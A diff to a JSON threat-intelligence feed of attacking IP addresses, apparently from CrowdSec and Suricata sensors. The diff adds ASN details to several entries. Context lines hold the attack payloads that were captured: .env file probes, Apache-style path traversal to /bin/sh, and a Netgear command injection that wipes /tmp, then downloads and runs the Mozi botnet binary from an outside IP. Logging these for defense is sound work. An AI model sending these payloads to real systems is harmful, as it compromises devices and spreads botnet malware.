@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-04-28T12:00:00Z",
+  "generated_at": "2026-04-28T13:00:00Z",
   "ttl_days": 7,
   "scope": "all",
   "counts": {
@@ -827,6 +827,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "16509",
+      "asn_name": "AMAZON-02 - Amazon.com",
+      "asn_prefix": "34.240.0.0/13",
       "tags": [
         "mwl:cloud=\"aws\""
       ],
@@ -847,6 +850,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "51852",
+      "asn_name": "PLI-AS Private Layer INC",
+      "asn_prefix": "179.43.146.0/24",
       "payloads": [
         "GET /.env",
         "GET /.env.local",
@@ -875,6 +881,9 @@
         "crowdsec",
         "suricata"
       ],
+      "asn": "142647",
+      "asn_name": "NAN-AS-AP Nasstec Airnet Networks Private Limited",
+      "asn_prefix": "103.173.7.0/24",
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
@@ -891,6 +900,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "172.160.0.0/11",
       "tags": [
         "mwl:cloud=\"azure\""
       ],
@@ -909,6 +921,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.160.0.0/12",
       "tags": [
         "mwl:cloud=\"azure\""
       ]
@@ -923,7 +938,10 @@
       ],
       "sources": [
         "suricata"
-      ]
+      ],
+      "asn": "34534",
+      "asn_name": "BULLIONET FBW NETWORKS SAS",
+      "asn_prefix": "37.44.238.0/24"
     },
     {
       "ip": "209.97.171.8",
@@ -936,6 +954,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "209.97.160.0/20",
       "payloads": [
         "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
         "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
